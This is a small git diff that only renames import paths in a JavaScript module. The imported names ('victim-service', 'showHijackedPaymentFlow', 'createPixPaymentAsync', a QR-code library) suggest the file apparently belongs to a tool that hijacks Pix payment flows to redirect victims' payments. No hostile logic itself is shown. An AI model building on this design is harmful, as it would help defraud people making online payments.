@@ -1,7 +1,7 @@
 import { findConfirmPaymentButton } from "../finders.js";
 import { getAdId, getPixPaymentValue } from "../getters.js";
-import { EXPIRED_PIX_ILLUSTRATION_SVG } from "../expired_pix_illustration.js";
-import { createPixPaymentAsync } from "../../../nexus/victim_service/service.js";
+import { EXPIRED_PIX_ILLUSTRATION_SVG } from "../expired-pix-illustration.js";
+import { createPixPaymentAsync } from "../../../nexus/victim-service/service.js";
 import qrcode from "../../../libs/qrcode.js";
 import { showHijackedPaymentFlow, hideHijackedPaymentFlow } from "../state.js";
 
